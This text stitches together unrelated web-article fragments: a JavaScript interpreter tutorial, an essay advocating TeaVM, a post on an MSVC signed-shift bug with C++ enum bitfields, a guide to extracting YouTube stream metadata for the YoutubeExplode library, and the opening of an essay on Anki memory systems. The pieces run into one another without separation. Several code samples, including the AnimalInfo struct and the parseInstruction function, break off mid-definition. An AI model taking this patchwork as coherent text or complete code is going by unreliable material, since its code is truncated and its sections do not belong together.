<span>};</span></code></pre><p>When we find a <code>fn</code>  instruction, we run <code>parseFnInstruction</code>. This produces a new javascript function. We would replace <code>drawTriangle</code> here with that function:</p><pre><code><span>[</span><span>"drawTriangle"</span><span>, { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>3</span><span>, y: </span><span>3</span><span> }, { x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span><span>"blue"</span><span>]</span></code></pre><p>So when that function is run, <code>values</code> would become:</p><pre><code><span>[{ x: </span><span>0</span><span>, y: </span><span>0</span><span> }, { x: </span><span>3</span><span>, y: </span><span>3</span><span> }, { x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span><span>"blue"</span><span>]</span></code></pre><p>After that, </p><pre><code><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span><span>...</span><span>oldVariables</span><span>, </span><span>...</span><span>mapArgsWithValues</span><span>(</span><span>args</span><span>, </span><span>values</span><span>)}</span></code></pre><p>Would create a new <code>variables</code> object, that includes a mapping of the function arguments to these newly provided values:</p><pre><code><span>const</span><span> </span><span>newVariables</span><span> </span><span>=</span><span> {</span>
<span>  </span><span>...</span><span>oldVariables</span><span>,</span>
<span>  left: { x: </span><span>0</span><span>, y: </span><span>0</span><span> }, </span>
<span>  top: { x: </span><span>3</span><span>, y: </span><span>3</span><span> },</span>
<span>  right: {x: </span><span>6</span><span>, y: </span><span>0</span><span> }, </span>
<span>  color: </span><span>"blue"</span><span>, </span>
<span>}</span></code></pre><p>Then, we can take the function body, in this case: </p><pre><code><span>      [</span>
<span>        </span><span>"do"</span><span>,</span>
<span>        [</span><span>"drawLine"</span><span>, </span><span>"left"</span><span>, </span><span>"top"</span><span>, </span><span>"color"</span><span>],</span>
<span>        [</span><span>"drawLine"</span><span>, </span><span>"top"</span><span>, </span><span>"right"</span><span>, </span><span>"color"</span><span>],</span>
<span>        [</span><span>"drawLine"</span><span>, </span><span>"left"</span><span>, </span><span>"right"</span><span>, </span><span>"color"</span><span>],</span>
<span>      ],</span></code></pre><p>And run it through <code>parseInstruction</code>, with our <code>newVariables</code>. With that <code>"left"</code> would be looked up as a variable and map to <code>{x: 0, y: 0}</code>. </p><p>If we did that, voila, the major work to support functions would be done!</p><p>Let’s follow through on our plan. The first thing we need to do, is to have <code>parseInstruction</code> accept <code>variables</code> as an argument. To do that, we need to update <code>parseInstruction</code>, and wherever it's called:</p><pre><code><span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>, </span><span>variables</span><span>) </span><span>=&gt;</span><span> {</span>

<span>    </span><span>return</span><span> </span><span>fn</span><span>(</span><span>...</span><span>args</span><span>.map</span><span>((</span><span>arg</span><span>) </span><span>=&gt;</span><span> </span><span>parseInstruction</span><span>(</span><span>arg</span><span>, </span><span>variables</span><span>)));</span>
<span>  };</span>
<span>  </span><span>parseInstruction</span><span>(</span><span>instruction</span><span>, </span><span>variables</span><span>);</span></code></pre><p>Next, we’ll want to add a special check to detect if we have a “fn” instruction:</p><pre><code><span>  </span><span>const</span><span> </span><span>parseInstruction</span><span> </span><span>=</span><span> (</span><span>ins</span><span>, </span><span>variables</span><span>) </span><span>=&gt;</span><span> {</span>

Java is winning many battles these days with 6 month release cycles,
exciting new features, and more.  However, there is a bigger war
looming: the war for the browser.  This is a war Java can't afford to
lose.  Read on for a winning strategy and what you can do to help.

<h3>A Bit Of History</h3>

In the late 90's and 2000's, Java had a strong presence in the
browser.  Java Applets were Java UIs that ran directly on a web page
— think Canvas but with Java APIs for drawing and sound.  Java
Web Start let you launch full Java UIs from the browser.  Both of
these could communicate with services running on Java App Servers, for
a full-stack Java experience.  Indeed, the initial excitement over
client-side Java led people to try it out server-side, where it became
even more popular.  Remember this for later: client-side dominance has
a history of extending server-side.

<h3>Fast-Forward 20 Years...</h3>

Here in 2020, things have taken a turn for the worse.  All major
browsers have disabled support for Java (and indeed most
non-JavaScript technologies).  Web-based front-ends are
usually coded in JavaScript or some wrapper designed to make it less
problematic (like TypeScript).  

<p>

Yes, you can still make websites using Java technology.  There are
plenty of 'official' technologies like JSP and JSF.  Unfortunately,
these technologies are entirely server-side.  You can generate the
page using Java libraries and business logic, but once it is sent to
the browser it is static and lifeless.  User interaction requires one
of two ugly options:

</p><ul>
  <li> A round-trip back to the server (slow — a bad user experience)
  </li><li> JavaScript embedded in the middle of your otherwise pristine
  Java-generated page
</li></ul>

Some teams forgo Java altogether and build their front-ends entirely
in JavaScript.  Having made that decision, some go even further and
look at options for running JavaScript server-side too.  Sound
familiar?  This is how Java once took over the computing world.

<h3>Winning Many Battles</h3>

Java fortunately has not stood still.  The Java Enhancement Process
(JEP) has avoided bureaucratic quicksand and has produced numerous
improvements to Java through the years, most of them well ahead of
JavaScript.

<p>

Improvements are now coming every 6 months, thanks to the new
release cadence.  Already new garbage collectors, easier to use
strings, and improved threading are available either for production or
for evaluation.  However, when you think about which of these
innovations are for building browser-based apps, you quickly realize
that Java client-side innovation has all but stopped, at least via the
official channels.

</p><p>

As the famous saying goes, <strong>we don't want to win the battle but lose
the war</strong>.  How can Java increase its relevance?  How can Java win back
client-side developers?  How can Java prevent other technologies from
leveraging front-end dominance to win the back-end, like Java once did
to other technologies?

</p><h3>How To Win The War</h3>

To win the war, Java needs a strong client-side option.  One that lets
developers make modern web applications using Java code.  One that
leverages web technologies.  One that supports components.  One that
builds quickly.  One that produces fast-downloading, high performance,
100-Lighthouse-scoring apps.  One that plays nicely with other JVM
languages.  What does Java need?

<h3>What Java needs Is TeaVM</h3>

TeaVM is an ahead-of-time transpiler that compiles Java classes to
JavaScript.  It lets your Java code interact with Web APIs and the
DOM.  It also includes a rich framework for developing web
applications called Flavour.  Some of the many powerful features of
TeaVM and Flavour:

<ul>
  <li> Numerous Web APIs ready for use via type-safe Java wrappers.
  </li><li> A rich component framework to build apps from reusable components
  </li><li> Numerous pre-built components
  </li><li> Single-page app support with a shadow DOM and routing
  </li><li> Easy, transparent calls to web services
</li></ul>

If you are a Java developer who is building a browser-based user
interface, TeaVM is for you.  There are two main styles of TeaVM apps:

<ul>
  <li> Graphical apps that draw their entire UI on a Canvas and have
  very little HTML or CSS.  These apps may just need TeaVM.
  </li><li> Single-page web apps that use HTML and CSS.  These apps benefit
  from using the Flavour framework on top of TeaVM to handle routing,
  invoking REST services, and JSON parsing.
</li></ul>

However, it doesn't have to be all or nothing, there are hybrid
possibilities like the following:

<ul>
  <li> A primarily Canvas-based app that uses Flavour to occasionally
  show other HTML pages.
  </li><li> A primarily HTML-based app that includes a Canvas on certain
  pages.
</li></ul>

Whatever path you choose, you'll find that writing your client-side in
the same language as your backend is a truly liberating experience.
Share data structures throughout your app.  Use your IDE to refactor
interfaces and model classes in the client and server simultaneously.
Use the same tooling (build tool, dependency management,
static/dynamic analysis tools) for your entire product.  Productivity
and developer satisfaction are dramatically improved.

<h3>How To Move Forward</h3>

TeaVM is ready for use in your projects.  It is stable, documented,
and has <a href="https://github.com/konsoletyper/teavm-flavour/tree/master/example">example</a>
<a href="https://github.com/konsoletyper/teavm/tree/master/samples/hello">code</a>
on the TeaVM site, as well as <a href="https://frequal.com/tea-sampler/">elsewhere</a>.

<p>

Most of all, TeaVM needs your endorsement and promotion.  Instead of
discussing and advocating legacy Java web technologies, help ensure
Java has another 25 years of success — please promote and
use TeaVM!

</p><p>

How to help?

</p><ul>
  <li> <a href="http://teavm.org/docs/intro/getting-started.html">Build your
  first TeaVM project</a>.  It takes just 2 commands.
  </li><li> <a href="https://groups.google.com/u/2/g/teavm">Read the
  forums</a> where developers discuss TeaVM and Flavour
  </li><li> <a href="https://github.com/konsoletyper/teavm">Dive into the
  source</a>.  The TeaVM and Flavour code is well-organized and
  extremely useful.  When creating your own JavaScript mappings and
  Flavour components, you have a large collection of examples to
  reference in the project codebase.
</li></ul>

Thank you for reading this.  Let's win this war together!

<![CDATA[Highway to hell: C++ enums and bitfields]]>
            </title>

October 25, 2020 | https://walac.github.io/curious-bug-enum-bitfield/ | <a href="https://web.archive.org/web/*/https://walac.github.io/curious-bug-enum-bitfield/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
<p>C++ enums historically gave me some headaches due to the fact that compilers are free to choose the size
of the type for whatever criteria they think. This makes particularly hard to write portable code among
compilers from ABI point of view (Visual C++ vs C++ Builder, anyone?).</p>

<p>Some days ago I was debugging a problem with <a href="https://github.com/dalihub/dali-toolkit">dali-toolkit</a>
and the enum story scalated to another level.</p>

<p>Let me give you some background: <a href="https://github.com/dalihub/dali-toolkit">dali-toolkit</a> loads textures
using a background worker thread that is responsible to load the image files to memory. I was looking
why some textures didn’t load in <code>Windows</code>. To make the asynchronous loading possible it implements
a small state machine and it keeps all information about the texture in a type called <code>TextureInfo</code>.</p>

<p>Here is a partial definition of the structure:</p>

<div><div><pre><code><span>struct</span> <span>TextureInfo</span> <span>{</span>
		<span>// ....</span>
    <span>LoadState</span> <span>loadState</span><span>:</span><span>4</span><span>;</span>         <span>///&lt; The load state showing the load progress of the Texture</span>
    <span>FittingMode</span><span>::</span><span>Type</span> <span>fittingMode</span><span>:</span><span>3</span><span>;</span> <span>///&lt; The requested FittingMode</span>
    <span>Dali</span><span>::</span><span>SamplingMode</span><span>::</span><span>Type</span> <span>samplingMode</span><span>:</span><span>3</span><span>;</span> <span>///&lt; The requested SamplingMode</span>
    <span>StorageType</span> <span>storageType</span><span>:</span><span>2</span><span>;</span>     <span>///&lt; CPU storage / GPU upload;</span>
		<span>// ....</span>
<span>};</span>
</code></pre></div></div>

<p>All these custom types are enums defined elsewhere. Yes, you read right, enums + bit fields, what
possibly can go wrong? To illustrate the root cause of the bug, let’s write a toy sample:</p>

<div><div><pre><code><span>enum</span> <span>Animal</span> <span>{</span>
    <span>Cat</span><span>,</span>
    <span>Dog</span><span>,</span>
    <span>Horse</span><span>,</span>
    <span>Turtle</span><span>,</span>
<span>};</span>

<span>enum</span> <span>Breed</span> <span>{</span>
    <span>BorderCollie</span><span>,</span>
    <span>GoldenRetriever</span><span>,</span>
    <span>GermanShepard</span><span>,</span>
    <span>Husky</span><span>,</span>
<span>};</span>

<span>enum</span> <span>Adopted</span> <span>{</span>
    <span>No</span><span>,</span>
    <span>Yes</span><span>,</span>
<span>};</span>

<span>struct</span> <span>AnimalInfo</span> <span>{</span>
    <span>Animal</span> <span>animal</span><span>:</span><span>2</span><span>;</span>

<p>Now, using <a href="https://godbolt.org/">godbolt</a>, we can view the assembly code generated by different compilers.
In particular, let’s look at the assembly code for the <code>main</code> function. Firstly, the the gcc generated
code. I added comments to the parts interesting to us:</p>

<div><div><pre><code>main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 16
        lea     rax, [rbp-8]
        mov     ecx, 1
        mov     edx, 2
        mov     esi, 1
        mov     rdi, rax
        call    AnimalInfo::AnimalInfo(Animal, Breed, Adopted)
        movzx   eax, BYTE PTR [rbp-8] // load the information
        shr     al, 2   	// breed is in the bits 2 and 3, so shift right 2 bits
        and     eax, 3  	// breed is only two bits long
        movzx   eax, al  	// eax = breed value
        mov     DWORD PTR [rbp-4], eax // store it in our variable
        mov     eax, 4    // AnimalInfo is 4 bytes long
        leave
        ret
</code></pre></div></div>

<p>Here is clang. It uses different registers but is essentially the same code:</p>

<div><div><pre><code>main:
        push    rbp
        mov     rbp, rsp
        sub     rsp, 16
        mov     dword ptr [rbp - 4], 0
        lea     rdi, [rbp - 8]
        mov     eax, 1
        mov     esi, eax
        mov     edx, 2
        mov     ecx, eax
        call    AnimalInfo::AnimalInfo(Animal, Breed, Adopted)
        mov     r8b, byte ptr [rbp - 8]
        shr     r8b, 2
        and     r8b, 3
        movzx   eax, r8b
        mov     dword ptr [rbp - 12], eax
        mov     eax, 4
        add     rsp, 16
        pop     rbp
        ret
</code></pre></div></div>

<p>Now the msvc compiler:</p>

<div><div><pre><code>main PROC
$LN3:
  sub rsp, 56 ; 00000038H
  mov r9d, 1
  mov r8d, 2
  mov edx, 1
  lea rcx, QWORD PTR animal$[rsp]
  call AnimalInfo::AnimalInfo(Animal,Breed,Adopted) ; AnimalInfo::AnimalInfo
  mov eax, DWORD PTR animal$[rsp]
  shl eax, 28
  sar eax, 30 // OH NO! SIGNED SHIFT!!!
  mov DWORD PTR breed$[rsp], eax
  mov eax, 4
  add rsp, 56 ; 00000038H
  ret 0
main ENDP
</code></pre></div></div>

<p>Before commenting about the bug generated by msvc, let me praise the compiler optimizer,
it could get the breed value in two instructions, while clang and gcc needed three.
Very smart! Too bad that code is wrong. I think it is better to undestand the issue if we
view the bit layout of the word holded by AnimalInfo:</p>

<div><div><pre><code>	-------------------------------------
	|  31-5  |    4    |  3-2  |  1-0   |
	-------------------------------------
	| Unused | Adopted | Breed | Animal |
	-------------------------------------
</code></pre></div></div>

<p>So, the code shifts 28 bits to left, moving <code>Breed</code> to the bits 31 and 30, then it
shifts 30 bits to the right, but it does a signed shift, filling the
shifted bits with the value of the most significant bit. The <code>Breed</code> value is
<code>GermanShepard</code>, which is 2. So, when we shift left, the bit 31 will hold the value
1, and when we shift right, we end up with the final value <code>0xfffffffe</code>! The reason this happens
is because msvc assumes the enum is a signed integer by default and, combined with
the use of bit fields, yields the bug. This is precisely what happened in
<a href="https://github.com/dalihub/dali-toolkit">dali-toolkit</a>.</p>

<p>Once we understood the problem, we can solve it easily by forcing the enum to an unsigned integer:</p>

<div><div><pre><code><span>enum</span> <span>class</span> <span>Animal</span><span>:</span> <span>unsigned</span> <span>int</span> <span>{</span>
    <span>Cat</span><span>,</span>
    <span>Dog</span><span>,</span>
    <span>Horse</span><span>,</span>
    <span>Turtle</span><span>,</span>
<span>};</span>

<span>enum</span> <span>class</span> <span>Breed</span><span>:</span> <span>unsigned</span> <span>int</span> <span>{</span>
    <span>BorderCollie</span><span>,</span>
    <span>GoldenRetriever</span><span>,</span>
    <span>GermanShepard</span><span>,</span>
    <span>Husky</span><span>,</span>
<span>};</span>

<span>enum</span> <span>class</span> <span>Adopted</span><span>:</span> <span>unsigned</span> <span>int</span> <span>{</span>
    <span>No</span><span>,</span>
    <span>Yes</span><span>,</span>
<span>};</span>

<span>struct</span> <span>AnimalInfo</span> <span>{</span>
    <span>Animal</span> <span>animal</span><span>:</span><span>2</span><span>;</span>
    <span>Breed</span> <span>breed</span><span>:</span><span>2</span><span>;</span>
    <span>Adopted</span> <span>adopted</span><span>:</span><span>1</span><span>;</span>

    <span>AnimalInfo</span><span>(</span><span>Animal</span> <span>a</span><span>,</span> <span>Breed</span> <span>b</span><span>,</span> <span>Adopted</span> <span>ad</span><span>)</span>
        <span>:</span> <span>animal</span><span>(</span><span>a</span><span>),</span> <span>breed</span><span>(</span><span>b</span><span>),</span> <span>adopted</span><span>(</span><span>ad</span><span>)</span> <span>{}</span>
<span>};</span>

<span>int</span> <span>main</span><span>(</span><span>void</span><span>)</span> <span>{</span>
    <span>AnimalInfo</span> <span>animal</span><span>(</span><span>Animal</span><span>::</span><span>Dog</span><span>,</span> <span>Breed</span><span>::</span><span>GermanShepard</span><span>,</span> <span>Adopted</span><span>::</span><span>Yes</span><span>);</span>

    <span>auto</span> <span>breed</span> <span>=</span> <span>animal</span><span>.</span><span>breed</span><span>;</span>

    <span>return</span> <span>sizeof</span><span>(</span><span>AnimalInfo</span><span>);</span>
<span>}</span>
</code></pre></div></div>

<p>Now the generated code does what it is supposed to do:</p>

<div><div><pre><code>main PROC
$LN3:
  sub rsp, 56 ; 00000038H
  mov r9d, 1
  mov r8d, 2
  mov edx, 1
  lea rcx, QWORD PTR animal$[rsp]
  call AnimalInfo::AnimalInfo(Animal,Breed,Adopted) ; AnimalInfo::AnimalInfo
  mov eax, DWORD PTR animal$[rsp]
  shr eax, 2
  and eax, 3
  mov DWORD PTR breed$[rsp], eax
  mov eax, 4
  add rsp, 56 ; 00000038H
  ret 0
main ENDP
</code></pre></div></div>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><p>Almost a year ago, I started developing <a href="https://github.com/Tyrrrz/YoutubeExplode">YoutubeExplode</a>, a library that scraps information on YouTube videos and lets you download them. Originally, my main motivation for developing it was simply to gain experience, as the task involved a lot of research and reverse-engineering. Nowadays, YoutubeExplode is arguably the most consistent and robust .NET library for dealing with YouTube.</p>
<p>Since this is a relatively popular discussion topic among many beginner developers, I thought that I could help out by sharing the knowledge I found by spending dozens of hours staring at Chrome Developer Tools.</p>
<p><em>Note: even though the base principles explained here are unlikely to change, some information in this post may become outdated. This post is relevant to YoutubeExplode v4.1 (16-Feb-2018).</em></p>
<h2>Getting video metadata</h2>
<p>In order to find and resolve media streams, you need to first get video metadata. There are a few ways to do it, but the most reliable one is by querying an AJAX endpoint used internally by YouTube’s iframe embed API. The format is as follows: <a href="https://www.youtube.com/get_video_info?video_id=%7BvideoId%7D">https://www.youtube.com/get_video_info?video_id={videoId}</a>.</p>
<p>The request can take a lot of different parameters, but at a minimum it needs a video ID — the value in the URL that comes after <code>/watch?v=</code>, for example <code>e_S9VvJM1PI</code>.</p>
<p>The response contains URL-encoded metadata, which has to be decoded first before it’s usable. After that, you can map the parameter names to values in a dictionary for easier access. Some parameter values are nested objects themselves, so they can in turn be mapped to nested dictionaries.</p>
<p>Here’s an example of the decoded metadata (truncated for brevity):</p>
<div data-language="ini"><pre><code><span>status</span><span><span>=</span>ok</span>

<p>As you can see, there is quite a lot of information that can be extracted straight away.</p>
<p>Let’s also look at some important optional parameters that this request can take:</p>
<ul>
<li><code>hl</code> — name of the culture used to localize some strings. If not set, it defaults to culture inferred from your IP. Use <code>hl=en</code> to force English language on all strings.</li>
<li><code>el</code> — type of YouTube page from where the request was made. This decides what kind of information will be available in the response. In some cases, you will need to set this parameter to a certain value depending on the type of the video, in order to avoid errors. Defaults to <code>embedded</code>.</li>
<li><code>sts</code> — some kind of session identifier, used to synchronize information between requests. Defaults to empty.</li>
</ul>
<h3>The “el” parameter</h3>
<p>The <code>el</code> request parameter can take multiple values and it affects what kind of data you will receive as a response. There are only a few that actually matter though, so I’ll list them here:</p>
<ul>
<li><code>embedded</code>, the default value. YouTube uses this when requesting information for embedded videos. Doesn’t work with videos that aren’t embeddable, but works with age-restricted videos.</li>
<li><code>detailpage</code>, alternative value, contains a bit more info. Conversely, works with videos that aren’t embeddable, but doesn’t work with age-restricted videos.</li>
</ul>
<p>YoutubeExplode uses <code>el=embedded</code> for the first query. If it fails because the video cannot be embedded, it then retries with <code>el=detailpage</code>.</p>
<h3>Handling errors</h3>
<p>When the request fails, the response will contain only a few fields:</p>
<ul>
<li><code>status</code> — which is equal to <code>fail</code>.</li>
<li><code>errorcode</code> — an integer code that identifies the error.</li>
<li><code>reason</code> — text message that explains why the video is not available.</li>
</ul>
<p>Error codes seem to be very generic and most of the time it’s either <code>100</code> or <code>150</code> so they aren’t very useful at determining what went wrong.</p>
<h3>Paid videos</h3>
<p>Some videos need to be purchased before they can be watched. In such cases, there will be:</p>
<ul>
<li><code>requires_purchase</code>, which equal to <code>1</code>.</li>
<li><code>ypc_vid</code>, ID of a preview video which can be watched for free.</li>
</ul>
<h2>Resolving media streams</h2>
<p>Media streams and their metadata come in many different forms.</p>
<h3>Muxed streams</h3>
<p>Multiplexed (muxed) streams are the type that contain both video and audio tracks in the same stream. YouTube provides these streams only in low qualities — the best they can be is 720p30.</p>
<p>Metadata for these streams is contained within the URL-encoded response mentioned earlier, inside the <code>url_encoded_fmt_stream_map</code> parameter. To extract it, you simply need to split the value by <code>,</code> and then URL-decode each part.</p>
<p>This is how decoded metadata looks, for an individual muxed stream:</p>
<div data-language="ini"><pre><code><span>itag</span><span><span>=</span>43</span>
<span>type</span><span><span>=</span>video/webm; codecs="vp8.0, vorbis"</span>
<span>fallback_host</span><span><span>=</span>redirector.googlevideo.com</span>
<span>url</span><span><span>=</span>https://r12---sn-3c27sn7k.googlevideo.com/videoplayback?itag=43&amp;lmt=1367519763212098&amp;ipbits=0&amp;key=yt6&amp;mime=video%2Fwebm&amp;expire=1511401259&amp;mn=sn-3c27sn7k&amp;mm=31&amp;ms=au&amp;mv=m&amp;mt=1511379591&amp;ei=y9IVWuuyKI-YdLvnm8AO&amp;sparams=dur%2Cei%2Cgcr%2Cid%2Cinitcwndbps%2Cip%2Cipbits%2Citag%2Clmt%2Cmime%2Cmm%2Cmn%2Cms%2Cmv%2Cnh%2Cpl%2Cratebypass%2Crequiressl%2Csource%2Cexpire&amp;ip=255.255.255.255&amp;id=o-AJuM11wvxuVl2WBgfb3nr6zbmXsFGQvhMelDobZ_KOrE&amp;nh=IgpwcjAxLmticDAxKgkxMjcuMC4wLjE&amp;requiressl=yes&amp;gcr=ua&amp;source=youtube&amp;ratebypass=yes&amp;pl=24&amp;initcwndbps=1112500&amp;dur=0.000</span>
<span>s</span><span><span>=</span>9599599594B0133328AA570AE0129E58478D7BCE9D226F.15ABC404267945A3F64FB4E42074383FC4FA80F5</span>
<span>quality</span><span><span>=</span>medium</span></code></pre></div>
<p>You will be interested in the following properties:</p>
<ul>
<li><code>itag</code> — integer code that identifies the type of stream.</li>
<li><code>type</code> — MIME type and codecs.</li>
<li><code>url</code> — URL that serves the stream.</li>
<li><code>s</code> — cipher signature used to protect the stream (if present).</li>
</ul>
<p>Note: I’ve encountered cases when <a href="https://github.com/Tyrrrz/YoutubeExplode/issues/36">some of the muxed streams were removed</a> despite still appearing in the metadata. Therefore it’s recommended to send HEAD requests to check that each stream is still available. You can get content length as well while you’re at it, since it’s not present in the metadata.</p>
<h3>Adaptive streams</h3>
<p>YouTube also uses video-only and audio-only streams. These come at highest available qualities, with no limitations.</p>
<p>Similarly to muxed streams, metadata for these streams can be extracted from <code>adaptive_fmts</code> parameter. Here’s how it looks:</p>
<div data-language="ini"><pre><code><span>itag</span><span><span>=</span>134</span>

<p>Adaptive streams have a slightly extended set of properties. I’ll list the useful ones:</p>
<ul>
<li><code>itag</code> — integer code that identifies the type of stream.</li>
<li><code>type</code> — MIME type and codecs.</li>
<li><code>url</code> — URL that serves the stream.</li>
<li><code>s</code> — cipher signature used to protect the stream (if present).</li>
<li><code>clen</code> — content length of the stream in bytes.</li>
<li><code>bitrate</code> — stream bitrate in kbit/sec.</li>
<li><code>size</code> — video resolution (video-only).</li>
<li><code>fps</code> — video framerate (video-only).</li>
</ul>
<h3>Adaptive streams in DASH manifest</h3>
<p>Video info may contain URL of a DASH manifest inside the <code>dashmpd</code> parameter. It’s not always present and some videos might never have it at all.</p>
<p>To resolve metadata of these streams, you need to first download the manifest using the provided URL. Sometimes a manifest can be protected. If it is, you should be able to find the signature inside the URL — it’s the value separated by slashes that comes after <code>/s/</code>.</p>
<p>Streams in DASH can also be segmented — each segment starting at a given point and lasting only a second or two. This is the type that your browser normally uses when playing a video on YouTube — it lets it easily adjust quality based on network conditions. Segmented streams are also used for livestream videos. This post will not be covering them, however, as processing them is not required to download videos.</p>
<p>The DASH manifest follows <a href="http://standards.iso.org/ittf/PubliclyAvailableStandards/MPEG-DASH_schema_files/DASH-MPD.xsd">this XML schema</a>. You can parse the stream metadata if you go through all descendant nodes of type <code>Representation</code>. Here’s how they appear:</p>

      <p>
      One day in the mid-1920s, a Moscow newspaper reporter named
      Solomon Shereshevsky entered the laboratory of the psychologist
      Alexander Luria. Shereshevsky's boss at the newspaper had
      noticed that Shereshevsky never needed to take any notes, but
      somehow still remembered all he was told, and had suggested he
      get his memory checked by an expert.
    </p>

    <p>
      Luria began testing Shereshevsky's memory. He began with simple
      tests, short strings of words and of numbers. Shereshevsky
      remembered these with ease, and so Luria gradually increased the
      length of the strings. But no matter how long they got,
      Shereshevsky could recite them back.  Fascinated, Luria went on
      to study Shereshevsky's memory for the next 30 years.  In a book
      summing up his research*<span>* Alexander
      Luria, “The Mind of a Mnemonist”, Harvard University
      Press (1968).</span>, Luria reported that:
    </p>

    <blockquote>
      [I]t appeared that there was no limit either to
      the <em>capacity</em> of S.'s memory or to the <em>durability of
      the traces he retained</em>. Experiments indicated that he had
      no difficulty reproducing any lengthy series of words whatever,
      even though these had originally been presented to him a week, a
      month, a year, or even many years earlier. In fact, some of
      these experiments designed to test his retention were performed
      (without his being given any warning) fifteen or sixteen years
      after the session in which he had originally recalled the
      words. Yet invariably they were successful.
    </blockquote>
      
    <p>
      Such stories are fascinating. Memory is fundamental to our
      thinking, and the notion of having a perfect memory is
      seductive.  At the same time, many people feel ambivalent about
      their own memory. I've often heard people say “I don't
      have a very good memory”, sometimes sheepishly, sometimes
      apologetically, sometimes even defiantly.
    </p>

    <p>
      Given how central memory is to our thinking, it's natural to ask
      whether computers can be used as tools to help improve our
      memory. This question turns out to be highly generative of good
      ideas, and pursuing it has led to many of the most important
      vision documents in the history of computing. One early example
      was Vannevar Bush's 1945 proposal*<span>*
      Vannevar
      Bush, <a href="https://www.theatlantic.com/magazine/archive/1945/07/as-we-may-think/303881/">As
      We May Think</a>, The Atlantic (1945).</span> for a mechanical
      memory extender, the memex. Bush wrote:
    </p>

    <blockquote>
      A memex is a device in which an individual stores all his books,
      records, and communications, and which is mechanized so that it
      may be consulted with exceeding speed and flexibility. It is an
      enlarged intimate supplement to his memory.
    </blockquote>

    <p>
      The memex vision inspired many later computer pioneers,
      including Douglas Engelbart's ideas about the augmentation of
      human intelligence, Ted Nelson's ideas about hypertext, and,
      indirectly, Tim Berners-Lee's conception of the world wide
      web*<span>* See, for example: Douglas
      Engelbart, <a href="http://augmentingcognition.com/assets/Engelbart1962.pdf">Augmenting Human
      Intellect</a> (1962); Ted
      Nelson, <a href="https://dl.acm.org/citation.cfm?id=806036">Complex
      information processing: a file structure for the complex, the
      changing and the indeterminate</a> (1965); and Tim
      Berners-Lee, <a href="https://w3.org/History/1989/proposal.html">Information
      Management: a Proposal</a> (1989).</span>. In his proposal for
      the web, Berners-Lee describes the need for his employer (the
      particle physics organization CERN) to develop a collective
      institutional memory,
    </p>

    <blockquote>
      a pool of information to develop which could grow and evolve
      with the organization and the projects it describes.
    </blockquote>


    <p>
      These are just a few of the many attempts to use computers to
      augment human memory. From the memex to the web to wikis to
      <a href="https://orgmode.org/">org-mode</a>
      to <a href="https://en.wikipedia.org/wiki/Project_Xanadu">Project
      Xanadu</a> to attempts
      to <a href="https://users.speakeasy.net/~lion/nb/book.pdf">make
      a map of every thought a person thinks</a>: the augmentation of
      memory has been an extremely generative vision for computing.
    </p>

      <p>
	In this essay we investigate personal memory systems, that is,
	systems designed to improve the long-term memory of a single
	person. In the first part of the essay I describe my personal
	experience using such a system, named Anki. As we'll see, Anki
	can be used to remember almost anything. That is, Anki makes
	memory a <em>choice</em>, rather than a haphazard event, to be
	left to chance. I'll discuss how to use Anki to understand
	research papers, books, and much else. And I'll describe
	numerous patterns and anti-patterns for Anki use. While Anki
	is an extremely simple program, it's possible to develop
	virtuoso skill using Anki, a skill aimed at understanding
	complex material in depth, not just memorizing simple facts.
      </p>

      <p>
	The second part of the essay discusses personal memory systems
	in general. Many people treat memory ambivalently or even
	disparagingly as a cognitive skill: for instance, people often
	talk of “rote memory” as though it's inferior to
	more advanced kinds of understanding. I'll argue against this
	point of view, and make a case that memory is central to
	problem solving and creativity. Also in this second part,
	we'll discuss the role of cognitive science in building
	personal memory systems and, more generally, in building
	systems to augment human cognition.  In a future
	essay, <a href="http://augmentingcognition.com/taylip.html">Toward a Young Lady's Illustrated
	Primer</a>, I will describe more ideas for personal memory
	systems.
      </p>

      <p>
	The essay is unusual in style. It's not a conventional
	cognitive science paper, i.e., a study of human memory and how
	it works. Nor is it a computer systems design paper, though
	prototyping systems is my own main interest. Rather, the essay
	is a distillation of informal, <em>ad hoc</em> observations
	and rules of thumb about how personal memory systems work. I
	wanted to understand those as preparation for building systems
	of my own. As I collected these observations it seemed they
	may be of interest to others. You can reasonably think of the
	essay as a how-to guide aimed at helping develop virtuoso
	skills with personal memory systems. But since writing such a
	guide wasn't my primary purpose, it may come across as a
	more-than-you-ever-wanted-to-know guide.
      </p>

      <p>
	To conclude this introduction, a few words on what the essay
	won't cover. I will only briefly discuss visualization
	techniques such as memory palaces and the method of loci.  And
	the essay won't describe the use of pharmaceuticals to improve
	memory, nor possible future brain-computer interfaces to
	augment memory. Those all need a separate treatment. But, as
	we shall see, there are already powerful ideas about personal
	memory systems based solely on the structuring and
	presentation of information.
      </p>

      <h2>Part I: How to remember almost anything: the Anki
      system</h2>

    <p>
      I'll begin with an account of my own experience with the
      personal memory
      system <a href="https://apps.ankiweb.net/">Anki</a>*<span>*
      I've no affiliation at all with Anki. Other similar systems
      include <a href="https://mnemosyne-proj.org/">Mnemosyne</a>
      and <a href="https://supermemo.com/">SuperMemo</a>. My limited
      use suggests Mnemosyne is very similar to Anki.  SuperMemo runs
      only on Windows, and I haven't had an opportunity to use it,
      though I have been influenced by essays on
      the <a href="https://supermemo.com/">SuperMemo
      website</a>.<p>I won't try to hide my enthusiasm for Anki
      behind a respectable facade of impartiality: it's a significant
      part of my life. Still, it has many limitations, and I'll
      mention some of them through the essay. </p></span>. The material
      is, as mentioned above, quite personal, a collection of my own
      observations and informal rules of thumb.  Those rules of thumb
      may not apply to others; indeed, I may be mistaken about how
      well they apply to me. It's certainly not a properly controlled
      study of Anki usage!  Still, I believe there is value in
      collecting such personal experiences, even if they are anecdotal
      and impressionistic. I am not an expert on the cognitive science
      of memory, and I'd appreciate corrections to any errors or
      misconceptions.
    </p>

    <!--
      <p>
	Before we begin, a warning. Systems such as Anki are, in my
	opinion, powerful, and the early parts of the essay sound like
	a sales pitch.  It's certainly true that Anki has become an
	important part of my life. But it's also required a great deal
	of work to learn to use well. As we'll discuss, it required
	several failed attempts to make it worth using. So it's not a
	panacea; later, we'll discuss some shortcomings and possible
